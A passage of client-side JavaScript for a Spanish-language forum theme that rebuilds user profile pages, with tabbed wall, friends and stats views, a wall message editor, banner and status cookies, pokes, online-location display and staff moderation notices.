            var b = ['<strong>$1</strong>', '<em>$1</em>', '<span style="text-decoration:underline;">$1</span>', '<span style="text-decoration:line-through">$1</span>', '<div style="text-align:center;">$1</div>', '<span style="font-size: $1;">$2</span>', '<a href="$1"></a>', '<a href="$1">$2</a>', '<span style="color: $1">$2</span>', '<img src="$1"/>', '<table class="$1"><tbody><tr><td>$2</td></tr></tbody></table>'];
            var len = a.length;
            for (var i = 0; i < len; i++) {
                c = c.replace(a[i], b[i]);
            }
            return c
        },
        beforeUnload: function (a) {
            a && (window.onbeforeunload = function () {
                if (a.value.length) {
                    return '';
                }
            });
        },
        //***********
        togglebspoiler: function (elem) {
            $(elem.parentNode.nextSibling).toggle();
            elem.value = (elem.value === 'Mostrar') ? 'Ocultar' : 'Mostrar';
        },
        popup_post: function (url) {
            var popup_post_cache = {};
            var pid = 'p' + url.substr(url.lastIndexOf('#') + 1),
                box = init.g('#popup_post');
            if (!box) {
                box = $.Elem('div', {
                    id: 'popup_post',
                    innerHTML: 'cargando el post...'
                });
                init.move(document.body, box, 'append');
            }
            var show = function (html) {
                open = '<a href="##" onclick="$(\'#popup_post\').hide()">' + '<i class="fa fa-window-close" aria-hidden="true"></i></a><div class="innerpost">';
                var close = '</div><div class="visitpost"><a href="' + url + '">Visitar el post original</a></div>';
                box.innerHTML = open + init.BB.parse(html) + close;
                box.style.display = ''
            };
            var post = function (post) {
                var message = init.g('.content', post)[0].innerHTML;
                popup_post_cache[url] = message;
                show(message)
            };
            popup_post_cache[url] ? show(popup_post_cache[url]) : document.getElementById(pid) ? post(document.getElementById(pid)) : $(box).load(url + ' #' + pid, function () {
                post(document.getElementById(pid))
            })
        },
        backClose: function (c) {
            var a = init.g('#lightBG');
            init.fadeOut(a, 200);
            'undefined' != typeof c && (init.hide(init.g(c)));
        },
        backAdd: function () {
            var a = init.create('center', {
                text: 'Cargando...',
                style: {
                    color: '#fff',
                    minHeight: '600px'
                },
                childs: [{
                    tag: 'i',
                    class: 'fa fa-spinner fa-pulse fa-3x fa-fw',
                    style: {
                        color: '#fff',
                        marginTop: '20%'
                    }
                }]
            });
            return a;
        },
        //perfil publico
        perfil: {
            main: {
                tabId: function (a) {
                    return init.g('i', ops.activetab)[0].id == a
                },
                cargando: '<li id="li_content"><div style="width: 100%; text-align:center;color:#' + (pu ? '000' : 'fff') + '"><center><i style="color:#' + (pu ? '000' : 'fff') + ';font-size:32px"class="fa fa-spinner fa-pulse"></i>Cargando...</center></div></li>',
                variables: function () {
                    ops.idPerfil = init.uid(location.pathname);
                    ops.nombresinespacio = ops.sinEspacios(ops.nombre_perfil ? ops.nombre_perfil : ops.mi_nombre);
                    ops.activetab = init.g('.activetab')[0];
                    ops.main = init.g('#main');
                    ops.maincontent = init.g('#main-content');
                    ops.h1 = init.g('h1')[0];
                    ops.cpmain = init.g('#cp-main');
                    ops.pagetitle = init.g('.page-title')[0];
                    ops.field1 = init.g('#field_id1');
                    ops.field3 = init.g('#field_id3');
                    ops.tabs = init.g('#tabs');
                    ops.moduleFirst = pu && init.g('.module')[0];
                    ops.moduleLast = pu && init.g('.module')[1];
                    ops.layout = pu && init.g('#profile-advanced-layout');
                    ops.pradvdet = pu && init.g('#profile-advanced-details');
                    ops.proadvrig = pu && init.g('#profile-advanced-right');
                    ops.proadvlft = pu && init.g('#profile-advanced-left');
                    ops.h3 = pu && init.g('.h3', ops.moduleFirst)[0];
                    ops.imgAva = pu && init.g('img', ops.moduleFirst)[0];
                    ops.newMessage = pu && init.g('#new-message');
                    ops.proAdd = pu && init.g('#profile-advanced-add');
                    ops.innerPro = pu && init.g('.inner', ops.pradvdet)[0];
                    ops.bannerIMG = pu ? ops.field3 && init.g('.field_uneditable', ops.field3)[0].textContent : ops.lang.banner_blank;
                    ops.editorMuro = init.g('#AAGquickvm_message');
                },
                pagination: {
                    do: function (i) {
                        i.addEventListener('click', function (event) {
                            event.preventDefault();
                            ops.back(ops.backAdd());
                            var xml, href = this.href;
                            ops.xmlhRequest('', href, function (o) {
                                xml = o.responseXML;
                                ops.perfil.main.reFormato(ops.cpmain, xml);
                            });
                        }, false)
                    },
                    setup: function () {
                        var c, b = init.g('.pagination');
                        init.myarray(b, function (r) {
                            c = init.g('a', r);
                            init.myarray(c, function (i) {
                                /u(\d+)(wall|friends)(\?start=(\d+)|)/g.test(i.href) && (ops.perfil.main.pagination.do(i));
                            });
                        });
                    }
                },
                setup: function () {
                    var
                        a = init.create('a', {
                            href: '#',
                            class: 'pokie local',
                            attributes: {
                                onclick: 'ops.perfil.main.poke.send(this, event);return false'
                            },
                            childs: [{
                                tag: 'i',
                                class: 'fa fa-hand-o-right',
                                'aria-hidden': 'true'
                            }, {
                                tag: 'span',
                                text: ' Dar un toque',
                                style: {
                                    cursor: 'pointer'
                                }
                            }],
                        }),
                        c = /\u(3|89|92|17)wall/g.test(ts),
                        d = ops.proadvrig.lastChild,
                        e = ops.proAdd && init.contiene(ops.proAdd.firstChild, 'Suprimir');
                    //añadimos clases a los modulos
                    ops.maincontent.classList.add('profile-fix');
                    ops.moduleFirst.classList.add('modulo_uno');
                    ops.moduleLast.classList.add('modulo_dos');
                    //instalamos banner
                    !c && ops.perfil.main.portada.b();
                    //reconfiguramos los divs
                    init.move(ops.cpmain, ops.proadvrig, 'after', function () {
                        init.move(init.g('#profile-advanced-banner'), ops.moduleFirst, 'append');
                        init.move(d, ops.tabs, 'before');
                        init.move(ops.h3, ops.imgAva, 'before');
                        ops.proAdd && (e && ops.nombre_perfil != ops.mi_nombre || ops.soy_staff) && init.move(ops.h3, a, 'after');
                        !c && (ops.proAdd && init.move(ops.moduleFirst.firstChild, ops.proAdd, 'prepend'));
                        init.borrar(ops.pagetitle);
                    });
                    // todas las apps
                    ops.perfil.main.apps(ops.tabs, ops.moduleFirst, ops.proAdd, ops.moduleLast);
                    wl && c ? ops.perfil.main.historial() : wl && (ops.perfil.main.reFormato(ops.cpmain));
                    fr && (ops.perfil.amigos.formato());
                    setTimeout(function () {
                        var  n = init.g('.avatar', init.g('.modulo_dos')[0]),
                         publicidad = ops.maincontent.firstChild,
                         publicidad2 = ops.proadvrig.firstChild;
                        init.contiene(publicidad, 'google') && init.borrar(publicidad);
                        init.contiene(publicidad2, 'google') && init.borrar(publicidad2);
                        init.show(ops.proadvrig);
                        init.show(ops.layout);
                        init.fadeIn(ops.cpmain, 200);
                init.myarray(n, function (i) {
                        d = i.firstChild;
                        c = ops.html.img_ava_default;
                        e = i.parentNode;
                if ('undefined' != typeof a.href) {
                 ops.imgBroken(d, c)
                }
                })
                }, 100);
               
                },
                // ops.tabs, ops.moduleFirst, ops.proAdd, ops.moduleLast
                apps: function (a, b, c, d) {
                    ops.perfil.main.etiquetas(a);
                    ops.perfil.main.enlinea(b);
                    ops.perfil.main.dondeEstas(b);
                    ops.perfil.amigos.sinAmigos(c, d);
                    ops.perfil.main.ocultarMod();
                    ops.perfil.main.borrarCampos();
                    ops.perfil.amigos.mainAdd(c);
                    !wl && ops.perfil.main.portada.enter();
                    ops.perfil.main.addMod();
                    ops.perfil.main.stalker();
                    ops.perfil.main.portada.change();
                    ops.perfil.main.htmlPerfil();
                },
                ocultarMod: function () {
                    var a = ops.soy_staff,
                        b = ops.nombre_perfil,
                        c = init.g('#field_id-20');
                    if (c) {
                        (c && a) ? (b == ops.mi_nombre) && (init.hide(c)) : b !== ops.mi_nombre ? (init.hide(c)) : (init.show(c));
                        ops.moderacion_pub(c)
                    }
                },
                htmlPerfil: function () {
                    var a = init.g('.field_uneditable'),
                        b = ops.field3;
                    b && (init.g('dd', b)[0].firstChild.textContent = '[img]' + ops.bannerIMG + '[/img]');
                    init.myarray(a, function (i) {
                        i.innerHTML = ops.BBCodeToHtml(i.innerHTML)
                    });
                },
                portada: {
                    b: function () {
                        var i = pu ? ops.pradvdet : init.closest(init.g('#cp-main'), '.row3'),
                            t = pu ? 'prepend' : 'before',
                            e = ops.nombresinespacio,
                            n = ops.field3 && init.g('.field_uneditable', ops.field3)[0].textContent,
                            o = ops.field1 && init.g('.field_uneditable', ops.field1)[0].textContent,
                            p = Cookies.get('banner_src_' + e),
                            a = Cookies.get('perfil_status' + e),
                            s = '/u' + (pu ? ops.idPerfil : ops.mi_id),
                            r = ops.perfil.main.portada.crear();
                        !init.g('#banner-image') && init.move(i, r, t, function () {
                            var i = init.g('.status_fecha'),
                                t = init.g('.mi_status'),
                                e = function (e, n) {
                                    var o = init.g('#banner-image'),
                                        p = ops.perfil.main.portada.split(n);
                                    o.src = e;
                                    ops.imgBroken(o, 'https://cdn2.geckoandfly.com/wp-content/uploads/2013/07/0alone-black-cat-facebook-cover.jpg');
                                    i[0].textContent = p.tiempo;
                                    t[0].textContent = p.estado;
                                };
                            p ? e(p, a) : ops.field3 ? e(n, o) : ops.perfil.main.portada.get(s, function (i, t) {
                                e(i, t)
                            })
                        })
                    },
                    split: function (o) {
                        var l = /(Se modifico:)(\w.+)(?=\[\/td\]\[\/table\])/g,
                            d = /(.+)(?=\[table(.*)])/g;
                        return {
                            estado: o.match(d) && o.match(d)[0],
                            tiempo: o.match(l) && o.match(l)[0]
                        }
                    },
                    get: function (t, F) {
                        var a = ops.sinEspacios(pu ? ops.nombre_perfil : ops.mi_nombre);
                        ops.xmlhRequest('', t, function (t) {
                            var d = t.responseXML,
                                dd = init.g('#field_id1', d),
                                s = init.g('#field_id3', d),
                                r = init.g('.field_uneditable', s)[0].textContent,
                                tt = init.g('.field_uneditable', dd)[0].textContent,
                                m = ops.perfil.main.portada.split(tt),
                                o = 'banner_src_' + a,
                                p = 'perfil_status' + a;
                            ops.perfil.main.portada.recordar(o, r, p, tt);
                            F && F(r, tt)
                        });
                    },
                    olvidar: function (e, f) {
                        e != init.g('.field_uneditable', ops.field1)[0].textContent && Cookies.remove('perfil_status' + f)
                    },
                    recordar: function (c, d, p, tt) {
                        Cookies.set(c, d, {
                            expires: 365
                        });
                        Cookies.set(p, tt, {
                            expires: 365
                        })
                    },
                    crear: function () {
                        ops.perfil.main.variables();
                        var div, o = ops.nombresinespacio,
                            n = '/u' + (pu ? ops.idPerfil : ops.mi_id),
                            s = Cookies.get('banner_src_' + o),
                            p = Cookies.get('perfil_status' + o),
                            m = p || ops.field1;
                        ops.field1 && ops.perfil.main.portada.olvidar(p, o);
                        div = init.create('div', {
                            attributes: {
                                id: 'profile-advanced-banner',
                                align: 'center',
                            },
                            childs: [{
                                tag: 'div',
                                attributes: {
                                    id: 'status_content',
                                },
                                childs: [{
                                    tag: 'span',
                                    class: 'time_status_container',
                                    childs: [{
                                        tag: 'i',
                                        class: 'fas fa-clock',
                                    }]
                                }, {
                                    tag: 'b',
                                    class: 'status_fecha',
                                    text: 'cargando...',
                                }, {
                                    tag: 'b',
                                    class: 'mi_status',
                                    text: '',
                                }]
                            }, {
                                tag: 'img',
                                attributes: {
                                    id: 'banner-image',
                                    src: ''
                                }
                            }]
                        });
                        return div;
                    },
                    enter: function () {
                        var e, c, g,
                            a = init.g('#field_id3'),
                            b = init.g('.field_uneditable', a),
                            d = init.g('#profile-advanced-banner');
                        if (a) {
                            var n = b && b.value,
                                m = init.g('dd', a)[0].firstChild,
                                l = function (event) {
                                    g = init.g('img', d)[0];
                                    g.src = n;
                                    init.fadeIn(g, 400, function () {
                                        setTimeout(function () {
                                            m.innerHTML = ops.BBCodeToHtml('[img]' + n + '[/img]');
                                        }, 500);
                                        ops.toolbar.notify.go('Banner Perfil actualizado', null, 'check', 'fas fa-exclamation-circle');
                                        Cookies.remove('banner_src_' + ops.sinEspacios(ops.nombre_perfil));
                                        Cookies.set('banner_src_' + ops.sinEspacios(ops.nombre_perfil), n, {
                                            expires: 365
                                        })
                                    });
                                },
                                i = function (event) {
                                    a.removeEventListener('mouseenter', h, false);
                                    c = b.nextElementSibling;
                                    c.addEventListener('click', l, false);
                                },
                                h = function (event) {
                                    e = init.g('.ajax-profil_edit');
                                    e.length && (e[0].addEventListener('click', i, false))
                                };
                            a.addEventListener('mouseenter', h, false);
                        }
                    },
                    change: function () {
                        var i, f,
                            a = init.g('#profile_field_13_1'),
                            g = init.g('.mi_status')[0],
                            h = init.g('.status_fecha')[0],
                            b = ' [table class=fecha_up][td]Se modifico:' + ops.checkTime() + ' [/td][/table]';
                        a && (a.addEventListener('blur', function () {
                            a.value = a.value + b;
                            i = ops.perfil.main.portada.split(a.value);
                            f = init.g('.ajax-profil_valid')[0];
                            f.addEventListener('click', function () {
                                g.textContent = i.estado;
                                h.textContent = i.tiempo;
                                setTimeout(ops.perfil.main.htmlPerfil(), 500);
                            }, false)
                        }, false))
                    },
                },
                tabsAsincronas: function () {
                    ops.perfil.main.variables();
                    var d, b, c, a = init.g('a', ops.tabs);
                    init.myarray(a, function (i) {
                        i.addEventListener('click', function (e) {
                            e.preventDefault();
                            ops.perfil.main.cambiarTab(this, this.href);
                        })
                    }, false)
                },
                cambiarTab: function (a, b) {
                    ops.back(ops.backAdd());
                    ops.perfil.main.active(a);
                    ops.xmlhRequest('', b, function (o) {
                        var doc = o.responseXML;
                        var xml = init.g('#cp-main', doc),
                            cpmain = init.g('#cp-main');
                        pr || sr ? ops.config.re(cpmain, doc) : pu && ops.perfil.main.reFormato(cpmain, doc);
                        ops.backClose();
                    })
                },
                borrarCampos: function () {
                    if (_userdata.user_level !== 1 && ops.perfil.main.tabId('perfil')) {
                        var n = init.g('#field_id1'),
                            o = init.g('#field_id3'),
                            p = init.g('#field_id4'),
                            q = init.g('#field_id5'),
                            r = [n, o, p, q];
                        init.myarray(r, function (i) {
                            init.hide(i);
                        })
                    }
                },
                reFormato: function (cpmain, xml) {
                    ops.perfil.main.variables();
                    ops.count = _toolbar.notifications.unread;
                    var f, o,
                        a = ops.activetab,
                        b = init.g('i', a)[0].id.toLowerCase(),
                        c = init.create('span', {
                            childs: [{
                                tag: 'i',
                                attributes: {
                                    id: 'muro',
                                    class: 'fa fa-address-card',
                                }
                            }, {
                                tag: 'h4',
                                html: '&nbsp;Muro'
                            }]
                        }),
                        m = ops.moduleLast,
                        h = ops.count != 0 ? '(' + ops.count + ') ' : '',
                        j = init.g('span', ops.tabs)[0],
                        cpmainxml = init.g('#cp-main', xml),
                        titulo = function (a) {
                            document.title = h + a
                        },
                        html = function (a, b) {
                            init.move(a, b, 'replaceWith', function () {
                                ops.perfil.main.variables();
                                init.fadeIn(b, 200);
                            });
                        };
                    ops.main.className = '';
                    init.replaceHtml(c, j);
                    ops.perfil.amigos.sinAmigos();
                    switch (b) {
                        case 'muro':
                            cpmain.classList.add('wall');
                            ops.proAdd && !init.contiene(ops.proAdd.firstChild, 'Suprimir') && a.classList.add('no_friend');
                            html(cpmain, ops.indice.muro.array(ops.perfil.muro.editor(xml)));
                            ops.perfil.main.pagination.setup();
                            ops.main.classList.add('wall');
                            ops.temas.editor.keyupTextarea(ops.editorMuro);
                            window.onbeforeunload = function () {
                                return '' != ops.editorMuro.value ? '' : void 0
                            };
                            ops.perfil.main.contextoMuro(ops.tabs);
                            ops.confirm();
                            titulo(ops.perfil.main.contexto(a));
                            ops.backClose();
                            break;
                        case 'perfil':
                            titulo('Perfil - ' + ops.nombre_perfil);
                            html(cpmain, cpmainxml);
                            o = ops.bannerIMG;
                            init.g('dd', ops.field3)[0].firstChild.textContent = '[img]' + o + '[/img]';
                            ops.perfil.main.reappmod();
                            ops.perfil.main.borrarCampos();
                            ops.perfil.main.htmlPerfil();
                            ops.perfil.main.portada.change();
                            ops.perfil.main.portada.enter();
                            ops.perfil.main.ocultarMod();
                            break;
                        case 'stats':
                            titulo('Estadísticas - ' + ops.nombre_perfil);
                            html(cpmain, cpmainxml);
                            break;
                        case 'amigos':
                            titulo(ops.perfil.main.contexto(a));
                            html(cpmain, ops.perfil.amigos.setup(xml));
                            cpmain.className = 'amigos';
                            ops.perfil.main.pagination.setup();
                            ops.confirm();
                            ops.backClose();
                            break;
                        case 'contacto':
                            titulo('Contacto - ' + ops.nombre_perfil);
                            html(cpmain, cpmainxml);
                            ops.perfil.main.reappmod();
                            ops.perfil.main.limpiar()
                            break;
                    }
                },
                limpiar: function () {
                    var a = init.g('#field_id-22'),
                        b = a && ops.getNextSiblings(a);
                    if (b) {
                        init.myarray(b, function (i) {
                            init.borrar(i)
                        })
                    }
                },
                stalkerPost: function () {
                    var a, b, d, f, g, h, i, j, k,
                        e = pu && ops.nombre_perfil === ops.mi_nombre;
                    if (!e) {
                        if (!Cookies.get(ops.mi_nombre + ops.nombre_perfil)) {
                            ops.xmlhRequest('', '/u' + ops.mi_id, function (c) {
                                k = c.responseXML;
                                a = ops.mi_id;
                                b = init.g('.field_uneditable', init.g('#field_id-8', k))[0].textContent;
                                d = ops.nombre_perfil + '(' + ops.checkTime() + ')' + b;
                                i = 'profile_field_13_-8';
                                ops.feedFields(b, i, d, '', function () {
                                    Cookies.set(ops.mi_nombre + ops.nombre_perfil, '1')
                                })
                            })
                        }
                    }
                },
                contexto: function (a) {
                    var c = ops.perfil.main.tabId('muro'),
                        d = ops.perfil.main.tabId('amigos'),
                        i = ops.nombre_perfil,
                        j = ops.mi_nombre,
                        n = c && i != j,
                        o = c && i == j,
                        p = d && i != j,
                        q = d && i == j,
                        m = n ? ' Muro de ' + i : o ? ' Mi muro' : p ? ' Amigos de ' + i : q && ' Mis amigos';
                    return m
                },
                active: function (f) {
                    var a = ops.activetab,
                        c = init.closest(f, 'li'),
                        b = c.classList.contains('activetab');
                    a.classList.remove('activetab');
                    !b && (c.classList.add('activetab'));
                },
                contextoMuro: function (tabs) {
                    var a = init.g('h1')[0],
                        b = init.g('span', tabs)[0],
                        c = init.g('#AAGquickvm_bb'),
                        d = init.g('img', init.g('.module')[0])[0],
                        e = ops.nombre_perfil === ops.mi_nombre,
                        f = e ? 'Mi muro' : 'Muro de ' + ops.nombre_perfil,
                        g = e ? ops.mi_avatar + ' Mi muro' : (c ? 'Escribe un mensaje en el muro de ' : 'No puedes escribir mensajes en el muro de ') + ops.nombre_perfil;
                    a.innerHTML = '<p class="walltitulo">' + g + '</p>';
                    init.replaceHtml(init.create('fragment', {
                        childs: [{
                            tag: 'i',
                            attributes: {
                                id: 'muro',
                            },
                            class: 'fa fa-address-card',
                        }, {
                            tag: 'h4',
                            html: '&nbsp;' + f
                        }]
                    }), b);
                    c && (c.innerHTML += !init.g('img', c).length ? ops.mi_avatar : '');
                },
      etiquetas: function (c) {
    // Aseguramos que c exista
    if (!c) {
        console.warn('[ops.etiquetas] Contenedor "c" no definido');
        return;
    }

    // Buscar todos los spans dentro de c
    var spans = init.g('span', c);
    if (!spans || !spans.length) {
        console.warn('[ops.etiquetas] No se encontraron <span> dentro de', c);
        return;
    }

    // Array de etiquetas
    var etiquetas = [
        { id: 'muro',     class: 'fa fa-address-card',     text: 'Muro' },
        { id: 'perfil',   class: 'fa fa-th-list',          text: 'Perfil' },
        { id: 'stats',    class: 'fas fa-chart-pie',       text: 'Estadísticas' },
        { id: 'amigos',   class: 'fa fa-users',            text: 'Amigos' },
        { id: 'contacto', class: 'fa fa-share-alt-square', text: 'Contacto' }
    ];

    var i = 0;

    // Iteramos con tu helper personalizado
    init.myarray('a', spans, function (span) {
        var item = etiquetas[i++];
        if (!item) return; // Si no hay más ítems, salimos del bucle

        // Crear fragmento con ícono y título
        var frag = init.create('fragment', {
            childs: [
                { tag: 'i', id: item.id, class: item.class },
                { tag: 'h4', html: '&nbsp;&nbsp;' + item.text }
            ]
        });

        // Reemplazar contenido del span actual
        init.replaceHtml(frag, span);
    });
},

                enlinea: function (a) {
                    var b = init.g('em', a),
                        c = init.g('strong', a)[0],
                        d = b.length && init.contiene(b[0], '(en línea)');
                    init.insertar(c, d ? ops.lang.wifion : ops.lang.wifioff, 'after');
                    b.length && init.borrar(b[0]);
                },
                poke: {
                    send: function (b, event) {
                        var a = ops.perfil.main.tabId('muro'),
                            c = init.g('ol'),
                            d = ops.perfil.main.cargando,
                            e = ' [poke]¡Te envié un Toque![/poke] ',
                            g = ops.nombre_perfil,
                            texto = b.innerHTML;
                        ops.preventDoubleClick(b, true, false, true, event, undefined, undefined, function () {
                            ops.perfil.muro.enviarPost(g, e, 'Toque', function () {
                                c.length && a ? init.insertar(c[0], d, 'prepend') : ops.toolbar.notify.go('Se envio un toque a ' + g, null, 'poke', 'fas fa-hand-point-right');
                                a && (ops.perfil.muro.nuevoComentario(ops.idPerfil));
                                ops.preventDoubleClick(b, false);
                            });
                        });
                    },
                    post: function (a, b) {
                        var c = ' [poke]¡Te envié un Toque![/poke] ';
                        ops.perfil.muro.enviarPost(b, c, 'Toque', function () {
                            ops.toolbar.notify.go('Se envio un toque a ' + b, null, 'poke', 'fas fa-hand-point-right');
                        });
                    },
                },
                dondeEstas: function (t) {
                    var e, i, n = (init.g('.h3', t)[0], init.g('strong', t)[0]),
                        a = init.g('.online', t),
                        o = init.create('div', {
                            class: 'newonlineprofile',
                            text: 'Cargando...'
                        }),
                        s = ops.nombre_perfil == ops.mi_nombre;
                    init.move(n, o, 'before', function (t, n) {
                        i = function (t) {
                            n.innerHTML = '<i class="fa fa-compass"></i>&nbsp;' + t
                        };
                        e = function (t) {
                            t.classList.add('not');
                            i('No esta en el foro')
                        };
                        a.length ? ops.xmlhRequest('', '/viewonline', function (t) {
                            var a, o, l = t.responseXML,
                                f = init.g('.forumbg', l)[0],
                                c = init.g('a', f);
                            init.contiene(f, ops.nombre_perfil) ? init.myarray(c, function (t) {
                                a = init.contiene(t, ops.nombre_perfil);
                                a && (o = s ? 'Viendo mi perfil' : init.closest(t, 'tr').lastChild.textContent, i(o))
                            }) : e(n)
                        }) : e(n)
                    })
                },
                historial: function () {
                    document.title = 'Actividad de los usarios';
                    init.g('#wrap').className += ' history';
                    init.g('#main').className += ' wallhistorial';
                    init.g('#main-content').className += ' wall';
                    init.hide(init.g('.module')[0]);
                    init.hide(init.g('#profile-advanced-banner'));
                    init.g('h1')[0].textContent = 'Registro de información del foro';
                    ops.indice.cambiarHTML(init.g('.message-text'));
                    setTimeout(function () {
                        init.hide(init.g('#profile-advanced-right'))
                    }, 200);
                },
                stalker: function () {
                    var d, f, b, c,
                        a = init.g('#field_id-8');
                    if (a) {
                        b = init.g('span', a);
                        b[0].style.cursor = 'pointer';
                        b[0].addEventListener('click', function () {
                            f = init.g('.field_uneditable', a)[0].textContent;
                            ops.box(init.create('span', {
                                childs: [{
                                    tag: 'span',
                                    style: {
                                        whiteSpace: 'pre-wrap'
                                    },
                                    text: f.replace(/\)/g, ') \n')
                                }]
                            }), 'Registro de visitas a otros perfiles');
                        }, false)
                    };
                    ops.perfil.main.stalkerPost()
                },
                addMod: function () {
                    var b = init.g('#field_id-20'),
                        c = init.g('#profile_field_2_-20'),
                        mensaje = '[img]' + ops.lang.red_flag + '[/img]' + ops.checkTime() + ' Moderado por ([url=http://' + window.location.host + '/u' + ops.mi_id + '][b]' + ops.mi_nombre + '[/b][/url])',
                        textoAnterior = this.value;
                    if (b && ops.soy_staff && ops.nombre_perfil !== ops.mi_nombre && ops.perfil.main.tabId('perfil')) {
                        c.addEventListener('focus', function () {
                            c.style.height = '300px';
                            window.onbeforeunload = function () {
                                return ''
                            };
                            this.value += (textoAnterior ? '\n' : '') + mensaje;
                            ops.scroll.top(this, 300);
                            init.g('.ajax-profil_valid')[0].addEventListener('click', function () {
                                c.value.length && (window.onbeforeunload = false, $.boxes({
                                    mode: 'confirm',
                                    title: '¿Deseas enviar un mensaje de notificación?',
                                    ok: function () {
                                        var t = c.value,
                                            username = ops.nombre_perfil,
                                            subject = '[Mensaje automático]: Fuiste moderado',
                                            message = '[b]Este mensaje es enviado automáticamente:[/b]\n [b][color=#FF0000]Fuiste moderado por un miembro de la administración, te recomiendo leer el reglamento.[/color][/b]\n [quote] ' + t + '[/quote]\n No responder este mensaje.';
                                        ops.i_a(null, null, subject, message, username, function () {
                                            ops.toolbar.notify.go(ops.mi_nombre + ' se envió un mensaje al usuario que estas moderando', null, 'check', 'fas fa-check-double', false);
                                        });
                                    }
                                }))
                            }, false);
                        }, false);
                    }
                },
                reappmod: function () {
                    init.cachedScript('https://allphpbb31.com/js/edit_c_ajx.js', function () {
                        ops.perfil.main.portada.enter();
                        ops.perfil.main.stalker();
                        ops.perfil.main.addMod()
                    });
                },
            },
            muro: {
                editor: function (xml) {
                    var d, f, c, a = init.g('#main'),
                        b = init.g('#profile-advanced-add'),
                        e = b && b.firstChild,
                        d = init.g('#cp-main', xml),
                        g = init.g('.panel', d)[0];
                    if (b && init.contiene(e, 'Suprimir') || ops.soy_staff || ops.nombre_perfil == ops.mi_nombre) {
                        f = init.create('form', {
                            attributes: {
                                id: 'AAGquickvm_form',
                                name: 'post'
                            },
                            childs: [{
                                tag: 'div',
                                attributes: {
                                    id: 'AAGquickvm_bb'
                                },
                                childs: [{
                                    tag: 'span',
                                    attributes: {
                                        onclick: 'ops.temas.editor.add(\'b\')',
                                        style: 'font-weight:bold',
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa-bold',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }]
                                }, {
                                    tag: 'span',
                                    attributes: {
                                        onclick: 'ops.temas.editor.add(\'u\')',
                                        style: 'text-decoration: underline',
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa-underline',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }]
                                }, {
                                    tag: 'span',
                                    attributes: {
                                        onclick: 'ops.temas.editor.add(\'i\')',
                                        style: 'font-style: italic',
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa-italic',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }]
                                }, {
                                    tag: 'span',
                                    attributes: {
                                        onclick: 'ops.temas.editor.add(\'url\')',
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa-external-link-square',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }]
                                }, {
                                    tag: 'span',
                                    attributes: {
                                        onclick: 'ops.temas.editor.add(\'img\')',
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa fa-tag',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }]
                                }, {
                                    tag: 'span',
                                    attributes: {
                                        onclick: 'ops.temas.editor.add(\'quote\')',
                                    },
                                    childs: [{
                                        tag: 'i',
                                        class: 'fa fa-quote-left',
                                        attributes: {
                                            'aria-hidden': 'true'
                                        }
                                    }]
                                }, ]
                            }, {
                                tag: 'div',
                                attributes: {
                                    id: 'AAGquickvm_main'
                                },
                                childs: [{
                                    tag: 'textarea',
                                    attributes: {
                                        id: 'AAGquickvm_message',
                                        placeholder: 'Escribe un mensaje en el muro de ' + ops.nombre_perfil,
                                        name: 'message',
                                    }
                                }],
                            }, {
                                tag: 'div',
                                attributes: {
                                    id: 'AAGquickvm_foot',
                                },
                                childs: [{
                                    tag: 'span',
                                    attributes: {
                                        id: 'AAGquickvm_send',
                                        onclick: 'ops.perfil.muro.prePost(this, event)'
                                    },
                                    text: 'Enviar Mensaje'
                                }, {
                                    tag: 'input',
                                    attributes: {
                                        type: 'hidden',
                                        name: 'username',
                                        value: ops.nombre_perfil
                                    }
                                }]
                            }]
                        });
                        init.move(g, f, 'prepend');

                    }
                    return xml;
                },
                currentCSS: function (c) {
                    return window.getComputedStyle ? getComputedStyle(c, null) : c.currentStyle
                },
                prePost: function (o, e) {
                    var i = init.closest(o, 'form'),
                        n = i.message,
                        l = i.username.value,
                        p = init.g(ind ? '.wiaag' : 'ol'),
                        s = ops.perfil.main.cargando,
                        t = pu ? ops.idPerfil : ops.mi_id,
                        u = ops.mi_nombre + ' escribió en el muro de : [url=' + window.location.href + ']' + ops.nombre_perfil + '[/url]';
                    '' != n.value ? (window.onbeforeunload = !1, ops.preventDoubleClick(o, !0, ind ? !0 : !1, !0, e, undefined, undefined, function () {
                        ops.perfil.muro.enviarPost(l, n.value, 'Mensaje para ' + l, function () {
                            l == ops.nombre_perfil || ind && l == ops.mi_nombre ? (init.insertar(p[0], s, 'prepend'), ops.perfil.muro.nuevoComentario(t)) : (ops.toolbar.notify.go('Has citado un comentario en el muro de ' + l, null, 'check', 'fas fa-check-double', false), !ind && ops.perfil.main.contextoMuro()), n.value = '', 'undefined' != typeof ops.placeholderwall && ops.placeholder(n, ops.placeholderwall), ops.preventDoubleClick(o, !1), !ind && ops.actividadFeed(u, 'Historial')
                        })
                    })) : (ops.toolbar.notify.go('No hay mensaje que enviar', null, 'alert', 'fas fa-exclamation-circle'), n.focus())
                },
                nuevoComentario: function (url) {
                    var mb, e, f, h,
                        g = pu && init.g('.fa-frown-o');
                    ops.xmlhRequest('', '/u' + url + 'wall', function (o) {
                        h = o.responseXML;
                        e = init.g(!ind ? 'ol' : '.wiaag');
                        f = init.g('#li_content');
                        pu && e.length && g.length && init.borrar(g[0]);
                        mb = init.g('.row', ops.indice.muro.array(h, 'ol', true))[0];
                        e.length && init.move(f, mb, 'replaceWith', function () {
                            !init.contiene(mb.className, 'new_post_wall load_wall_row') && mb.classList.add('new_post_wall', 'load_wall_row');
                            ops.scroll.top(mb, 200);
                            init.fadeIn(mb, 500);
                            ops.confirm();
                        });
                    });
                },
                citar: function (a) {
                    var row = init.closest(a, '.row'),
                        e = init.g('.message-text', row)[0].textContent,
                        c = document.forms.AAGquickvm_form.message,
                        b = a.name;
                    c.value += '[quote="' + b + '"]' + e + '[/quote]\n';
                    ops.placeholder(c, 'Citar a ' + b);
                    ops.scroll.top(init.g('#AAGquickvm_bb'), 200);
                },
                otros: function (e, t, src) {
                    switch (e) {
                        case 'responder_otros':
                            var s = t.name,
                                b = document.forms.AAGquickvm_form,
                                c = b.message,
                                d = b.username,
